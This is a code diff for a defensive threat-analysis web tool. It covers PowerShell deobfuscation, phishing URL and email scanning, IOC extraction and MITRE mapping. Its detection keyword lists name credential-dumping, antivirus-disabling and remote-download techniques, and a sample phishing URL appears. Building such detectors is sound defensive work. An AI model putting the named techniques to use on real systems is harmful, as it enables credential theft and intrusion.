+              </div>
+            </div>
+            <div class="ps-file-info" id="psFileInfo" style="display:none">
+              <div class="mg" id="psFileMeta"></div>
+            </div>
+          </div>
+
+          <div class="brow">
+            <button class="btn" onclick="analyzePS()">▶ DECODE + ANALYZE</button>
+            <button class="btn btn-r" onclick="clearPS()">✕ CLEAR</button>
+            <button class="btn btn-p" id="psSampleBtn" onclick="loadPSSample()">⚗ SAMPLE</button>
+          </div>
+        </div>
+      </div>
+      <div class="ld" id="psLd"><div class="sp"></div><div class="lm" id="psLdMsg">DECODING...</div></div>
+      <div class="res" id="psRes">
+        <div class="risk-wrap">
+          <div id="psRK" class="rk low">
+            <div>
+              <div class="rk-l">THREAT LEVEL</div>
+              <div class="rk-v" id="psRV">LOW</div>
+              <div class="rk-sub" id="psMitreSum"></div>
+            </div>
+            <div class="rk-r">
+              <div class="rk-n" id="psSN">0</div>
+              <span class="rk-sl">RISK SCORE / 100</span>
+            </div>
+          </div>
+        </div>
+        <div class="pw"><div class="pbar" id="psPB"></div></div>
+
+        <!-- FILE ANALYSIS CARD (only shown for file uploads) -->
+        <div class="sec" id="psFileAnalysisSec" style="display:none">
+          <div class="st">📁 FILE ANALYSIS</div>
+          <div class="panel" style="padding:14px">
+            <div class="mg" id="psFileAnalysisMeta"></div>
+            <!-- Suspicious Extension Hits -->
+            <div id="psExtHitsWrap" style="display:none;margin-top:12px">
+              <div style="font-size:.55rem;letter-spacing:2px;color:var(--dim2);text-transform:uppercase;font-family:var(--ft);margin-bottom:6px">🚫 Suspicious Extension References</div>
+              <ul class="il" id="psExtHits"></ul>
+            </div>
+            <!-- Execution Flags -->
+            <div id="psFlagHitsWrap" style="display:none;margin-top:12px">
+              <div style="font-size:.55rem;letter-spacing:2px;color:var(--dim2);text-transform:uppercase;font-family:var(--ft);margin-bottom:6px">⚑ Execution Flags Detected</div>
+              <ul class="il" id="psFlagHits"></ul>
+            </div>
+            <!-- Suspicious URLs -->
+            <div id="psUrlHitsWrap" style="display:none;margin-top:12px">
+              <div style="font-size:.55rem;letter-spacing:2px;color:var(--dim2);text-transform:uppercase;font-family:var(--ft);margin-bottom:6px">🌐 Suspicious URL Patterns</div>
+              <ul class="il" id="psUrlHits"></ul>
+            </div>
+            <!-- Obfuscation Hits -->
+            <div id="psObfHitsWrap" style="display:none;margin-top:12px">
+              <div style="font-size:.55rem;letter-spacing:2px;color:var(--dim2);text-transform:uppercase;font-family:var(--ft);margin-bottom:6px">🔀 Obfuscation Techniques</div>
+              <ul class="il" id="psObfHits"></ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="sec"><div class="st">🔓 DECODE CHAIN</div><div id="psChain"></div></div>
+        <div class="sec"><div class="st">📊 ENTROPY</div><div id="psEntropy"></div></div>
+        <div class="sec"><div class="st">💻 DECODED OUTPUT</div><div class="mono" id="psFinal"></div></div>
+        <div class="sec" id="psRawSec" style="display:none"><div class="st">📄 RAW FILE PREVIEW</div><div class="mono" id="psRawPreview" style="max-height:200px;overflow-y:auto"></div></div>
+        <div class="sec"><div class="st">⚔️ MITRE ATT&CK</div><div class="mitre-grid" id="psMitreGrid"></div></div>
+        <div class="sec"><div class="st">📋 METADATA</div><div class="mg" id="psMeta"></div></div>
+        <div class="sec"><div class="st">🔍 IOCs</div><div class="ioc-grid" id="psIOCs"></div></div>
+        <div class="sec"><div class="st">🚨 INDICATORS</div><div class="panel"><ul class="il" id="psInds"></ul></div></div>
+        <div class="brow"><button class="btn btn-g" onclick="exportPDF('ps')">📄 EXPORT PDF REPORT</button></div>
+        <div style="font-size:.53rem;color:var(--dim2);text-align:right;margin-top:7px" id="psTS"></div>
+      </div>
+    </div>
+
+    <!-- URL PAGE -->
+    <div class="page" id="page-url" style="display:none">
+      <div class="panel">
+        <div class="ph">🌐 URL ANALYZER — REDIRECT · PHISHING · VIRUSTOTAL</div>
+        <div class="pb2">
+          <div class="ig"><label>Target URL</label>
+            <input type="text" id="urlIn" placeholder="https://secure-paypal-verify.xyz/login?ref=..."></div>
+          <div class="brow">
+            <button class="btn" onclick="analyzeURL()">▶ ANALYZE</button>
+            <button class="btn btn-r" onclick="clearURL()">✕ CLEAR</button>
+            <button class="btn btn-p" onclick="$('urlIn').value='http://secure-paypal-verify.xyz/login?redirect=paypal.com&cmd=exec&b64=dGVzdA==';toast('Sample loaded','c')">⚗ SAMPLE</button>
+          </div>
+        </div>
+      </div>
+      <div class="ld" id="urlLd"><div class="sp"></div><div class="lm" id="urlLm">ANALYZING...</div></div>
+      <div class="res" id="urlRes">
+        <div class="risk-wrap">
+          <div id="urlRK" class="rk low">
+            <div><div class="rk-l">THREAT LEVEL</div><div class="rk-v" id="urlRV">LOW</div></div>
+            <div class="rk-r"><div class="rk-n" id="urlSN">0</div><span class="rk-sl">RISK SCORE / 100</span></div>
+          </div>
+        </div>
+        <div class="pw"><div class="pbar" id="urlPB"></div></div>
+        <div id="vtBox" class="vt-box unknown" style="display:none">
+          <div class="vt-label">VIRUSTOTAL RESULT</div>
+          <div id="vtContent"></div>
+        </div>
+        <!-- ML PREDICTION BOX -->
+        <div id="mlBox" style="display:none;margin-top:10px">
+          <div class="panel" style="border-color:rgba(168,85,247,.4)">
+            <div class="ph" style="background:rgba(168,85,247,.08);border-color:rgba(168,85,247,.2)">
+              🤖 ML PHISHING PREDICTION — RANDOM FOREST CLASSIFIER
+              <span id="mlModelTag" style="margin-left:auto;font-size:.48rem;color:var(--p);letter-spacing:1px"></span>
+            </div>
+            <div class="pb2" style="padding:14px">
+              <!-- Verdict -->
+              <div id="mlVerdict" style="display:flex;align-items:center;gap:16px;margin-bottom:14px;padding:12px 16px;border-radius:2px;border:1px solid"></div>
+              <!-- Probability bars -->
+              <div style="margin-bottom:12px">
+                <div style="font-size:.55rem;letter-spacing:2px;color:var(--dim2);font-family:var(--ft);margin-bottom:7px">PREDICTION CONFIDENCE</div>
+                <div style="margin-bottom:7px">
+                  <div style="display:flex;justify-content:space-between;font-size:.68rem;margin-bottom:3px">
+                    <span style="color:var(--r)">🎣 PHISHING</span>
+                    <span id="mlPhishPct" style="color:var(--r);font-family:var(--fo);font-size:.7rem">0%</span>
+                  </div>
+                  <div style="height:8px;background:rgba(0,0,0,.4);border-radius:4px;overflow:hidden;border:1px solid var(--b1)">
+                    <div id="mlPhishBar" style="height:100%;background:linear-gradient(90deg,var(--r),#ff8000);border-radius:4px;width:0;transition:width .7s ease"></div>
+                  </div>
+                </div>
+                <div>
+                  <div style="display:flex;justify-content:space-between;font-size:.68rem;margin-bottom:3px">
+                    <span style="color:var(--g)">✅ LEGITIMATE</span>
+                    <span id="mlLegitPct" style="color:var(--g);font-family:var(--fo);font-size:.7rem">0%</span>
+                  </div>
+                  <div style="height:8px;background:rgba(0,0,0,.4);border-radius:4px;overflow:hidden;border:1px solid var(--b1)">
+                    <div id="mlLegitBar" style="height:100%;background:linear-gradient(90deg,var(--g),#00ffaa);border-radius:4px;width:0;transition:width .7s ease"></div>
+                  </div>
+                </div>
+              </div>
+              <!-- Top features -->
+              <div>
+                <div style="font-size:.55rem;letter-spacing:2px;color:var(--dim2);font-family:var(--ft);margin-bottom:7px">TOP CONTRIBUTING FEATURES</div>
+                <div id="mlFeatures" style="display:grid;grid-template-columns:1fr 1fr;gap:6px"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="sec"><div class="st">🔗 REDIRECT CHAIN</div><div class="panel" style="padding:9px 13px"><div id="urlChain"></div></div></div>
+        <div class="sec"><div class="st">📋 URL METADATA</div><div class="mg" id="urlMeta"></div></div>
+        <div class="sec"><div class="st">🎯 PHISHING INDICATORS</div><div class="panel"><ul class="il" id="urlInds"></ul></div></div>
+        <div class="brow"><button class="btn btn-g" onclick="exportPDF('url')">📄 EXPORT PDF REPORT</button></div>
+        <div style="font-size:.53rem;color:var(--dim2);text-align:right;margin-top:7px" id="urlTS"></div>
+      </div>
+    </div>
+
+    <!-- EML PAGE -->
+    <div class="page" id="page-eml" style="display:none">
+      <div class="panel">
+        <div class="ph">📧 EMAIL SCANNER — HEADER · BODY · ATTACHMENTS · ML · IOC · MITRE</div>
+        <div class="pb2">
+          <div class="dz" id="dzEml" ondragover="emlDrag(event,true)" ondragleave="emlDrag(event,false)" ondrop="emlDrop(event)" onclick="document.getElementById('emlFileInput').click()" style="cursor:pointer">
+            <input type="file" id="emlFileInput" accept=".eml,.msg" onchange="handleEml(this.files[0])" style="display:none">
+            <span class="dz-ic">📧</span>
+            <div class="dz-t">DROP .EML FILE HERE</div>
+            <div class="dz-s">click to browse · parses headers · scans body URLs · analyzes attachments</div>
+          </div>
+          <div class="dz-fn" id="emlFn"></div>
+          <div class="brow">
+            <button class="btn btn-r" onclick="clearEml()">✕ CLEAR</button>
+          </div>
+        </div>
+      </div>
+      <div class="ld" id="emlLd"><div class="sp"></div><div class="lm" id="emlLm">PARSING EMAIL...</div></div>
+      <div class="res" id="emlRes">
+
+        <!-- Stat row -->
+        <div class="srow" style="margin-top:16px">
+          <div class="sb2" style="border-top-color:var(--c)"><span class="sn" id="eHdrScore" style="color:var(--c)">0</span><span class="sl">HDR RISK</span></div>
+          <div class="sb2" style="border-top-color:var(--o)"><span class="sn" id="eUrls" style="color:var(--o)">0</span><span class="sl">URLS</span></div>
+          <div class="sb2" style="border-top-color:var(--r)"><span class="sn" id="eAttach" style="color:var(--r)">0</span><span class="sl">ATTACHMENTS</span></div>
+          <div class="sb2" style="border-top-color:var(--p)"><span class="sn" id="ePhish" style="color:var(--p)">0</span><span class="sl">ML PHISHING</span></div>
+          <div class="sb2" style="border-top-color:var(--y)"><span class="sn" id="eIOCt" style="color:var(--y)">0</span><span class="sl">IOCs</span></div>
+        </div>
+
+        <!-- Composite risk -->
+        <div class="risk-wrap">
+          <div id="emlRK" class="rk low">
+            <div><div class="rk-l">COMPOSITE THREAT LEVEL</div><div class="rk-v" id="emlRV">LOW</div><div class="rk-sub" id="emlMitreSub"></div></div>
+            <div class="rk-r"><div class="rk-n" id="emlSN">0</div><span class="rk-sl">RISK SCORE / 100</span></div>
+          </div>
+        </div>
+        <div class="pw"><div class="pbar" id="emlPB"></div></div>
+
+        <!-- Email metadata -->
+        <div class="sec">
+          <div class="st">📋 EMAIL METADATA</div>
+          <div class="mg" id="emlMeta"></div>
+        </div>
+
+        <!-- Header analysis -->
+        <div class="sec">
+          <div class="st">🔐 HEADER ANALYSIS
+            <span id="emlHdrBadge" style="margin-left:10px;font-size:.54rem;padding:2px 8px;border-radius:2px;font-family:var(--fo)"></span>
+          </div>
+          <div class="panel"><ul class="il" id="emlHdrInds"></ul></div>
+        </div>
+
+        <!-- Body analysis -->
+        <div class="sec">
+          <div class="st">📝 BODY ANALYSIS</div>
+          <div class="panel"><ul class="il" id="emlBodyInds"></ul></div>
+          <div class="mono" id="emlBodyPreview" style="margin-top:8px;max-height:120px;overflow-y:auto;font-size:.65rem"></div>
+        </div>
+
+        <!-- URL scan results -->
+        <div class="sec" id="emlUrlSec" style="display:none">
+          <div class="st">🌐 BODY URL SCAN RESULTS</div>
+          <div id="emlUrlList"></div>
+        </div>
+
+        <!-- Attachments -->
+        <div class="sec" id="emlAttachSec" style="display:none">
+          <div class="st">📎 ATTACHMENT ANALYSIS</div>
+          <div id="emlAttachList"></div>
+        </div>
+
+        <!-- MITRE -->
+        <div class="sec">
+          <div class="st">⚔️ MITRE ATT&CK</div>
+          <div class="mitre-grid" id="emlMitre"></div>
+        </div>
+
+        <!-- IOCs -->
+        <div class="sec">
+          <div class="st">🔍 EXTRACTED IOCs</div>
+          <div class="ioc-grid" id="emlIOCs"></div>
+        </div>
+
+        <div class="brow">
+          <button class="btn btn-g" onclick="exportPDF('eml')">📄 EXPORT PDF REPORT</button>
+        </div>
+        <div style="font-size:.53rem;color:var(--dim2);text-align:right;margin-top:7px" id="emlTS"></div>
+      </div>
+    </div>
+
+    <!-- IOC PAGE -->
+    <div class="page" id="page-ioc" style="display:none">
+      <div class="panel">
+        <div class="ph">🔍 IOC EXTRACTOR — IPs · DOMAINS · HASHES · CVEs · REGISTRY · PATHS</div>
+        <div class="pb2">
+          <div class="ig"><label>Raw Text / Log / Script</label>
+            <textarea id="iocIn" style="min-height:120px" placeholder="Paste logs, scripts, emails, or any raw text..."></textarea></div>
+          <div class="brow">
+            <button class="btn" onclick="extractIOCsPage()">🔍 EXTRACT</button>
+            <button class="btn btn-r" onclick="$('iocIn').value='';$('iocRes').classList.remove('on')">✕ CLEAR</button>
+          </div>
+        </div>
+      </div>
+      <div class="res" id="iocRes" style="margin-top:16px">
+        <div class="sec"><div class="st">EXTRACTED IOCs</div><div class="ioc-grid" id="iocOut"></div></div>
+        <div class="brow"><button class="btn btn-g" onclick="copyIOCs()">📋 COPY ALL</button></div>
+      </div>
+    </div>
+
+    <!-- DASHBOARD PAGE -->
+    <div class="page" id="page-dashboard" style="display:none">
+      <div class="panel">
+        <div class="ph">📊 DASHBOARD — SESSION & DATABASE STATISTICS</div>
+        <div class="pb2">
+          <div class="brow" style="margin-top:0">
+            <button class="btn" onclick="loadDashboard()">🔄 REFRESH</button>
+          </div>
+        </div>
+      </div>
+      <div id="dashContent" style="margin-top:16px">
+        <div class="empty" style="text-align:center;padding:40px;color:var(--dim2)">
+          <div style="font-size:2.5rem;margin-bottom:12px">📊</div>
+          <div style="font-family:var(--ft);font-size:.9rem;letter-spacing:2px">Click REFRESH to load dashboard</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- REPORT PAGE -->
+    <div class="page" id="page-report" style="display:none">
+      <div class="panel">
+        <div class="ph">📋 REPORT EXPORT — SESSION SUMMARY</div>
+        <div class="pb2">
+          <p style="font-size:.74rem;color:var(--dim2);margin-bottom:13px;line-height:1.7">Generate and export a full report of all scans in this session.</p>
+          <div class="brow">
+            <button class="btn" onclick="generateReport()">📄 GENERATE REPORT</button>
+            <button class="btn btn-g" onclick="copyReport()">📋 COPY</button>
+            <button class="btn btn-o" onclick="exportFullPDF()">📥 EXPORT PDF</button>
+            <button class="btn btn-r" onclick="clearSession()">🗑 CLEAR</button>
+          </div>
+        </div>
+      </div>
+      <div class="res" id="reportRes" style="margin-top:16px">
+        <div class="sec"><div class="st">SESSION REPORT</div><div class="report-area" id="reportOut"></div></div>
+      </div>
+    </div>
+
+    <!-- HEADER ANALYZER PAGE -->
+    <div class="page" id="page-headers" style="display:none">
+      <div class="panel">
+        <div class="ph">📨 EMAIL HEADER ANALYZER — SPF · DKIM · DMARC · RECEIVED CHAIN · ORIGINATING IP</div>
+        <div class="pb2">
+          <div class="ig"><label>Paste Raw Email Headers</label>
+            <textarea id="hdrsIn" style="min-height:160px;font-size:.72rem" placeholder="Paste the full raw headers here. In Gmail: open email → More (⋮) → Show original. In Outlook: File → Properties → Internet Headers."></textarea></div>
+          <div class="brow">
+            <button class="btn" onclick="analyzeHeaders()">🔍 ANALYZE</button>
+            <button class="btn btn-r" onclick="$('hdrsIn').value='';$('hdrsRes').style.display='none'">✕ CLEAR</button>
+          </div>
+          <div class="ld" id="hdrsLd"><div class="sp"></div><div class="lm">PARSING HEADERS...</div></div>
+        </div>
+      </div>
+      <div id="hdrsRes" style="display:none;margin-top:16px">
+        <div id="hdrsRisk" class="risk-wrap"></div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">📋 METADATA</div>
+          <div class="pb2"><div class="mg" id="hdrsMeta"></div></div>
+        </div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">🚩 HEADER FLAGS</div>
+          <div class="pb2"><div id="hdrsFlags"></div></div>
+        </div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">📡 RECEIVED CHAIN — HOP TRACE</div>
+          <div class="pb2"><div id="hdrsChain"></div></div>
+        </div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">🌐 ORIGINATING IP</div>
+          <div class="pb2"><div id="hdrsIP"></div></div>
+        </div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">🔍 IOCs EXTRACTED FROM HEADERS</div>
+          <div class="pb2"><div class="ioc-grid" id="hdrsIOC"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- WHOIS / DOMAIN AGE PAGE -->
+    <div class="page" id="page-whois" style="display:none">
+      <div class="panel">
+        <div class="ph">🌍 WHOIS / DOMAIN AGE CHECK — RDAP LOOKUP · REGISTRATION DATE · REGISTRAR · NAMESERVERS</div>
+        <div class="pb2">
+          <div class="ig"><label>Domain or URL</label>
+            <input type="text" id="whoisIn" placeholder="e.g. paypal-secure-login.xyz  or  https://suspicious-site.tk/login" style="font-size:.8rem"></div>
+          <div class="brow">
+            <button class="btn" onclick="whoisCheck()">🌍 LOOKUP</button>
+            <button class="btn btn-r" onclick="$('whoisIn').value='';$('whoisRes').style.display='none'">✕ CLEAR</button>
+          </div>
+          <div class="ld" id="whoisLd"><div class="sp"></div><div class="lm">QUERYING RDAP...</div></div>
+        </div>
+      </div>
+      <div id="whoisRes" style="display:none;margin-top:16px">
+        <div id="whoisAlert" style="margin-bottom:13px"></div>
+        <div class="panel">
+          <div class="ph">📋 REGISTRATION DETAILS</div>
+          <div class="pb2"><div class="mg" id="whoisMeta"></div></div>
+        </div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">🖥️ NAMESERVERS & STATUS</div>
+          <div class="pb2"><div id="whoisNS"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HASH LOOKUP PAGE -->
+    <div class="page" id="page-hash" style="display:none">
+      <div class="panel">
+        <div class="ph">🔐 VIRUSTOTAL HASH LOOKUP — MD5 · SHA1 · SHA256 · FULL ENGINE REPORT</div>
+        <div class="pb2">
+          <div class="ig"><label>File Hash</label>
+            <input type="text" id="hashIn" placeholder="Paste MD5 (32), SHA1 (40), or SHA256 (64) hex hash..." style="font-family:var(--fm);font-size:.79rem"></div>
+          <div class="brow">
+            <button class="btn" onclick="hashLookup()">🔍 LOOKUP</button>
+            <button class="btn btn-r" onclick="$('hashIn').value='';$('hashRes').style.display='none'">✕ CLEAR</button>
+          </div>
+          <div class="ld" id="hashLd"><div class="sp"></div><div class="lm">QUERYING VIRUSTOTAL...</div></div>
+          <div style="margin-top:12px;padding:10px 13px;background:rgba(0,82,180,.05);border:1px solid var(--b1);border-radius:4px;font-size:.66rem;color:var(--dim2);line-height:1.6">
+            ⚙️ Requires <strong style="color:var(--c)">VT_API_KEY</strong> environment variable.
+            Get a free key at <a href="https://www.virustotal.com" target="_blank" style="color:var(--c)">virustotal.com</a> →
+            <code style="font-size:.64rem">export VT_API_KEY=your_key</code> before starting Flask.
+          </div>
+        </div>
+      </div>
+      <div id="hashRes" style="display:none;margin-top:16px">
+        <div id="hashRisk" class="risk-wrap"></div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">📋 FILE DETAILS</div>
+          <div class="pb2"><div class="mg" id="hashMeta"></div></div>
+        </div>
+        <div class="panel" style="margin-top:13px">
+          <div class="ph">🛡️ ENGINE DETECTIONS</div>
+          <div class="pb2">
+            <div id="hashBar" style="margin-bottom:13px"></div>
+            <div id="hashEngines"></div>
+          </div>
+        </div>
+        <div class="panel" id="hashTagsPanel" style="margin-top:13px;display:none">
+          <div class="ph">🏷️ THREAT TAGS</div>
+          <div class="pb2"><div id="hashTags"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ AI ANALYSIS PAGE ══ -->
+  </div>
+</div>
+</div>
+<div id="toast"></div>
+
+<script>
+// ══════════════════════════════════════════════════════════
+// CONFIG & STATE
+// ══════════════════════════════════════════════════════════
+const API_BASE = 'http://localhost:5000/api';
+let backendOnline = false;
+let sessionScans = [];
+let totalIOCs = 0;
+let lastIOCData = null;
+let lastScanData = { zip:null, ps:null, url:null };
+let zipCache = {};
+
+// ── UTILITIES ─────────────────────────────────────────────
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
+const fmtSize = b => b>1048576?(b/1048576).toFixed(1)+' MB':b>1024?(b/1024).toFixed(1)+' KB':b+' B';
+const now = () => new Date().toLocaleString('en-IN',{hour12:false});
+
+// ── TOAST ─────────────────────────────────────────────────
+function toast(msg,type='c'){
+  const t=document.createElement('div');t.className=`toast-item toast-${type}`;t.textContent=msg;
+  $('toast').appendChild(t);setTimeout(()=>t.remove(),3200);
+}
+
+// ── PAGE NAV ──────────────────────────────────────────────
+function showPage(name){
+  document.querySelectorAll('.page').forEach(p=>p.style.display='none');
+  document.querySelectorAll('.sb-item').forEach(s=>s.classList.remove('active'));
+  $('page-'+name).style.display='block';
+  $('nav-'+name).classList.add('active');
+  if(name==='dashboard') loadDashboard();
+}
+
+// ── BACKEND CHECK ─────────────────────────────────────────
+async function checkBackend(){
+  try{
+    const r=await fetch(API_BASE+'/health',{signal:AbortSignal.timeout(2000)});
+    if(r.ok){
+      const d=await r.json();
+      backendOnline=true;
+      $('modeLive').className='live online';
+      $('modeText').textContent='API ONLINE';
+      $('modeBanner').className='mode-banner api';
+      $('modeBanner').textContent='✅ Flask backend connected — all scans saved to SQLite database';
+      if(d.vt_configured) toast('VirusTotal API active','g');
+      loadHistoryFromDB();
+    }
+  }catch(e){
+    backendOnline=false;
+    $('modeLive').className='live offline';
+    $('modeText').textContent='LOCAL MODE';
+  }
+}
+
+// ── HEADER STATS ──────────────────────────────────────────
+function updateHeader(){
+  $('hScans').textContent=sessionScans.length;
+  $('hThreats').textContent=sessionScans.filter(s=>s.risk==='HIGH').length;
+  $('hIOCs').textContent=totalIOCs;
+}
+
+function addHistory(type,name,risk,score){
+  sessionScans.unshift({type,name,risk,score,time:now()});
+  const hl=$('histList');
+  if(hl.querySelector('.no-hist'))hl.innerHTML='';
+  const d=document.createElement('div');d.className='hi';
+  d.innerHTML=`<div class="hi-type">${type}</div><div class="hi-name">${esc(name)}</div>
+    <div class="hi-risk ${risk.toLowerCase()}">${risk} · ${score}/100</div>
+    <div class="hi-time">${now()}</div>`;
+  hl.insertBefore(d,hl.firstChild);
+  updateHeader();
+}
+
+async function loadHistoryFromDB(){
+  try{
+    const r=await fetch(API_BASE+'/history?limit=15');
+    const data=await r.json();
+    if(!data.length)return;
+    const hl=$('histList');hl.innerHTML='';
+    data.forEach(s=>{
+      const d=document.createElement('div');d.className='hi';
+      d.innerHTML=`<div class="hi-type">${s.scan_type.toUpperCase()}</div>
+        <div class="hi-name">${esc(s.target_name)}</div>
+        <div class="hi-risk ${s.risk_level.toLowerCase()}">${s.risk_level} · ${s.risk_score}/100</div>
+        <div class="hi-time">${s.created_at}</div>`;
+      hl.appendChild(d);
+    });
+  }catch(e){}
+}
+
+// ── RISK ENGINE ───────────────────────────────────────────
+function setRisk(rkId,rvId,snId,pbId,score){
+  const lvl=score>=70?'HIGH':score>=35?'MEDIUM':'LOW';
+  const pbc=score>=70?'pbh':score>=35?'pbm':'pbl';
+  $(rkId).className='rk '+lvl.toLowerCase();
+  $(rvId).textContent=lvl;$(snId).textContent=score;
+  const pb=$(pbId);pb.style.width='0';pb.className='pbar '+pbc;
+  setTimeout(()=>pb.style.width=score+'%',150);
+  return lvl;
+}
+
+function card(l,v,c=''){return`<div class="mc"><div class="ml">${l}</div><div class="mv ${c}">${esc(String(v))}</div></div>`;}
+function indItem(tag,tc,txt,m=''){return`<li class="ii"><span class="tag ${tc}">${tag}</span><div class="ii-body"><span>${esc(txt)}</span>${m?`<div class="ii-mitre">⚔️ ${esc(m)}</div>`:''}</div></li>`;}
+
+// ── ENTROPY ───────────────────────────────────────────────
+function entropy(s){
+  if(!s)return 0;const f={};for(const c of s)f[c]=(f[c]||0)+1;const n=s.length;
+  return -Object.values(f).reduce((a,v)=>{const p=v/n;return a+p*Math.log2(p)},0);
+}
+function renderEntropy(e,id){
+  const pct=Math.min((e/8)*100,100),col=e>7?'var(--r)':e>5.5?'var(--o)':e>4?'var(--y)':'var(--g)';
+  const lbl=e>7?'ENCRYPTED/PACKED':e>5.5?'LIKELY OBFUSCATED':e>4?'MODERATE':'LOW (READABLE)';
+  $(id).innerHTML=`<div class="ent-wrap"><span class="ent-l">ENTROPY</span>
+    <div class="ent-bw"><div class="ent-b" style="width:${pct}%;background:${col}"></div></div>
+    <span class="ent-v" style="color:${col}">${e.toFixed(2)}</span></div>
+    <div style="font-size:.58rem;color:var(--dim2);margin-top:3px;font-family:var(--ft)">${lbl} · ${pct.toFixed(0)}% of max</div>`;
+}
+
+// ── IOC RENDER ────────────────────────────────────────────
+function renderIOCGrid(iocs,id){
+  const cats=[{key:'ips',l:'IP ADDRESSES',ic:'🌐'},{key:'domains',l:'DOMAINS',ic:'🔗'},{key:'urls',l:'URLS',ic:'📡'},{key:'hashes',l:'HASHES',ic:'#️⃣'},{key:'emails',l:'EMAILS',ic:'📧'},{key:'cves',l:'CVEs',ic:'⚠️'},{key:'regkeys',l:'REGISTRY KEYS',ic:'🔑'},{key:'paths',l:'FILE PATHS',ic:'📂'},{key:'darkweb',l:'DARK WEB / COVERT',ic:'🕸️'}];
+  let html='',total=0;
+  cats.forEach(c=>{const items=iocs[c.key]||[];if(!items.length)return;total+=items.length;
+    const dw=c.key==='darkweb';
+    html+=`<div class="ioc-cat"${dw?' style="border-color:var(--p)"':''}><div class="ioc-hdr"${dw?' style="color:var(--p);background:rgba(90,31,160,.07)"':''}>${c.ic} ${c.l} (${items.length})</div>`;
+    items.forEach(x=>{html+=`<div class="ioc-item"${dw?' style="color:var(--p)"':''}>${esc(x)}</div>`;});html+='</div>';});
+  $(id).innerHTML=html||'<div style="color:var(--dim2);font-size:.7rem;padding:10px">No IOCs found.</div>';
+  return total;
+}
+
+// ── MITRE RENDER ──────────────────────────────────────────
+const MITRE_INFO={
+  'T1059.001':['PowerShell','Execution'],'T1027':['Obfuscated Files','Defense Evasion'],
+  'T1105':['Ingress Transfer','C&C'],'T1562.001':['Disable Security','Defense Evasion'],
+  'T1003':['Credential Dumping','Credential Access'],'T1049':['Network Connections','Discovery'],
+  'T1053.005':['Scheduled Task','Persistence'],'T1547.001':['Registry Run Keys','Persistence'],
+  'T1136':['Create Account','Persistence'],'T1055':['Process Injection','Defense Evasion'],
+  'T1070.004':['File Deletion','Defense Evasion'],'T1041':['Exfil over C2','Exfiltration'],
+};
+function renderMitre(list,id){
+  if(!list||!list.length){$(id).innerHTML='<div style="color:var(--dim2);font-size:.7rem">No MITRE matches.</div>';return;}
+  $(id).innerHTML=list.map(t=>{const[n,tac]=MITRE_INFO[t]||['Unknown','Unknown'];
+    return`<div class="mt"><div class="mt-id">${t}</div><div class="mt-name">${n}</div><div class="mt-tac">${tac}</div></div>`;
+  }).join('');
+}
+
+// ── SYNTAX HIGHLIGHT ──────────────────────────────────────
+const CKW=['invoke-expression','iex','set-mppreference','disablerealtimemonitoring','amsiutils','invoke-mimikatz','sekurlsa','virtualallocex','writeprocessmemory'];
+const HKW=['downloadstring','downloadfile','webclient','bypass','executionpolicy','hidden','tcpclient','net user','shellexecute'];
+const MKW=['frombase64string','schtasks','reg add','start-process','send-mailmessage'];
+function hlPS(code){
+  let h=esc(code);
+  h=h.replace(/(#[^\n]*)/g,'<span class="kw-cm">$1</span>');
+  h=h.replace(/(&quot;[^&\n]*?&quot;)/g,'<span class="kw-s">$1</span>');
+  h=h.replace(/(\s-[A-Za-z]+)/g,'<span class="kw-flag">$1</span>');
+  CKW.forEach(k=>{h=h.replace(new RegExp(k,'gi'),m=>`<span class="kw-c">${m}</span>`);});
+  HKW.forEach(k=>{h=h.replace(new RegExp(k,'gi'),m=>`<span class="kw-h">${m}</span>`);});
+  MKW.forEach(k=>{h=h.replace(new RegExp(k,'gi'),m=>`<span class="kw-m">${m}</span>`);});
+  return h;
+}
+
+// ── LOCAL PS FALLBACK (used if backend offline) ───────────
+function localDecodePS(raw){
+  const layers=[];let cur=raw.trim();
+  const em=cur.match(/-e(?:nc(?:odedcommand)?)?\s+([A-Za-z0-9+/=]{20,})/i);
+  if(em){try{const b=atob(em[1]);let o='';for(let i=0;i<b.length-1;i+=2)o+=String.fromCharCode(b.charCodeAt(i));if(o.trim()){layers.push({type:'BASE64 -enc (UTF-16LE)',result:o});cur=o;}}catch(e){}}
+  const bm=cur.match(/['"]([A-Za-z0-9+/]{40,}={0,2})['"]/);
+  if(bm){try{const d=atob(bm[1]);if(/[\w\s(){};=]/g.test(d)){layers.push({type:'INLINE BASE64',result:d});cur=d;}}catch(e){}}
+  const fm=cur.match(/[Ff]rom[Bb]ase64[Ss]tring\(['"]([A-Za-z0-9+/=]{20,})['"]\)/);
+  if(fm){try{const d=atob(fm[1]);layers.push({type:'FromBase64String()',result:d});cur=d;}catch(e){}}
+  const hm=cur.match(/((?:0x[0-9a-fA-F]{2},?\s*){8,})/);
+  if(hm){try{const h=hm[1].replace(/0x/g,'').replace(/[\s,]+/g,'');const d=h.match(/.{2}/g).map(x=>String.fromCharCode(parseInt(x,16))).join('');if(/[\w\s]/g.test(d)){layers.push({type:'HEX SEQUENCE',result:d});cur=d;}}catch(e){}}
+  const sm=cur.match(/(?<![A-Za-z0-9+/])([A-Za-z0-9+/]{60,}={0,2})(?![A-Za-z0-9+/])/);
+  if(sm){try{const d=atob(sm[1]);if(/[a-zA-Z]{4}/.test(d)){layers.push({type:'STANDALONE BASE64',result:d});cur=d;}}catch(e){}}
+  if(!layers.length)layers.push({type:'PLAIN TEXT',result:cur});
+  return{layers,final:cur};
+}
+
+const PS_RULES_LOCAL=[
+  {kw:['invoke-expression','iex'],tag:'CRITICAL',tc:'tc',sc:30,txt:'IEX — executes arbitrary strings as commands.',m:'T1059.001'},
